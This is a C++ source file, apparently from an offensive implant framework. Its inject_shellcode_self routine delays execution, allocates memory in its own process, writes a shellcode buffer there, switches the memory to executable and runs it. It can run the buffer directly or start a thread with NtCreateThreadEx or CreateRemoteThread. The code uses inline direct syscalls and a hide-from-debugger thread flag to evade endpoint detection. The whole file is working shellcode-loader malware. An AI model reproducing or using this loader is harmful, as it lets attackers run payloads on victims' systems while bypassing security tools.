#pragma clang diagnostic ignored "-Wnested-anon-types"
#pragma clang diagnostic ignored "-Wgnu-anonymous-struct"

#include "inject.hpp"

#ifdef SYSCALLS
    #include "deps/inline_syscall/include/in_memory_init.hpp"
#endif

#define NT_FAIL(status) (status < 0)

void my_init_syscalls_list(void) {
    #ifdef SYSCALLS
    jm::init_syscalls_list();
    #endif
}

NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {
    NTSTATUS status = STATUS_PENDING;
    #ifdef _DEBUG_
        if (sleep_time > 0)
            printf("sleeping for %d seconds!\n", sleep_time);
    #endif
    #ifdef SYSCALLS
        LARGE_INTEGER li_sleep_time;
        li_sleep_time.QuadPart = -((long long)sleep_time * 10000000);
        status = INLINE_SYSCALL(NtDelayExecution)(TRUE, &li_sleep_time);
        if (NT_FAIL(status)) {
            #ifdef _DEBUG_
                printf("ERROR: NtDelayExecution = 0x%x\n", status);
            #endif
            return JOB_STATUS_ERROR;
        }
    #else
        sleep(sleep_time);
    #endif
    #if defined SELFINJECT && defined RX
        typedef int (*funcPtr)();
        funcPtr func = (funcPtr)shellcode;
        *phThread = 0;
        #ifdef _DEBUG_
            puts("self executing the payload");
        #endif
        return (*func)();
    #else
        void *allocation = nullptr;
        #ifdef SYSCALLS
            status = INLINE_SYSCALL(NtAllocateVirtualMemory)(
                (HANDLE)-1,
                &allocation,
                0,
                &size,
                MEM_RESERVE | MEM_COMMIT,
                #ifdef RX
                PAGE_READWRITE);
                #else
                PAGE_EXECUTE_READWRITE);
                #endif
            if (NT_FAIL(status) || !allocation)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtAllocateVirtualMemory = 0x%x\n", status);
                #endif
                return JOB_STATUS_ERROR;
            }
        #else
            allocation = VirtualAllocEx(
                (HANDLE)-1,
                0,
                size,
                MEM_RESERVE | MEM_COMMIT,
                #ifdef RX
                PAGE_READWRITE);
                #else
                PAGE_EXECUTE_READWRITE);
                #endif
            if (!allocation)
            {
                #ifdef _DEBUG_
                printf("ERROR: VirtualAllocEx = 0x%x\n", GetLastError());
                #endif
                return JOB_STATUS_ERROR;
            }
        #endif

        #ifdef _DEBUG_
            printf("Allocated rwx memory @ 0x%x\n", allocation);
        #endif

        SIZE_T bytesWritten = 0;

        #ifdef SYSCALLS
            status = INLINE_SYSCALL(NtWriteVirtualMemory)(
                (HANDLE)-1,
                allocation,
                shellcode,
                size,
                &bytesWritten);

            if (NT_FAIL(status) || bytesWritten < size)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtWriteVirtualMemory = 0x%x\n", status);
                #endif
                return JOB_STATUS_ERROR;
            }
        #else
            BOOL res = WriteProcessMemory(
                (HANDLE)-1,
                allocation,
                shellcode,
                size,
                &bytesWritten);

            if (!res) {
                #ifdef _DEBUG_
                printf("ERROR: WriteProcessMemory = 0x%x\n", status);
                #endif
                return JOB_STATUS_ERROR;
            }
        #endif

        #ifdef _DEBUG_
            printf("Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
        #endif

        #ifdef RX
            #ifdef SYSCALLS
            int old = 0;
            status = INLINE_SYSCALL(NtProtectVirtualMemory)(
                (HANDLE)-1,
                allocation,
                size,
                PAGE_EXECUTE_READ,
                &old
            );

            if (NT_FAIL(status) || bytesWritten < size)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtProtectVirtualMemory = 0x%x\n", status);
                #endif
                return JOB_STATUS_ERROR;
            }
            #else
            #endif
        #endif

        #ifdef SELFINJECT
            typedef int (*funcPtr)();
            funcPtr func = (funcPtr)shellcode;
            *phThread = 0;
            #ifdef _DEBUG_
                puts("self executing the payload");
            #endif
            return (*func)();
        #elif SYSCALLS
            status = INLINE_SYSCALL(NtCreateThreadEx)(
                phThread,
                THREAD_ALL_ACCESS,
                nullptr,
                (HANDLE)-1,
                allocation,
                allocation,
                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                0,
                0,
                0,
                nullptr);

            if (NT_FAIL(status) || !*phThread)
            {
                #ifdef _DEBUG_
                printf("ERROR: NtCreateThreadEx = 0x%x\n", status);
                #endif
                return status;
            }
        #else
            *phThread = CreateRemoteThread(
                (HANDLE)-1,
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)allocation,
                allocation,
                NULL, //THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                NULL
            );
        #endif

        #ifdef _DEBUG_
            printf("Created thread #%d\n", *phThread);
        #endif

        if (wait) {
            #ifdef SYSCALLS
                INLINE_SYSCALL(NtWaitForSingleObject)(*phThread, TRUE, NULL);
            #else
                #ifdef _DEBUG_
                    printf("Waiting for thread #%d\n", *phThread);
                #endif
                WaitForSingleObject(*phThread, -1);
            #endif
        }

        return status;
    #endif
}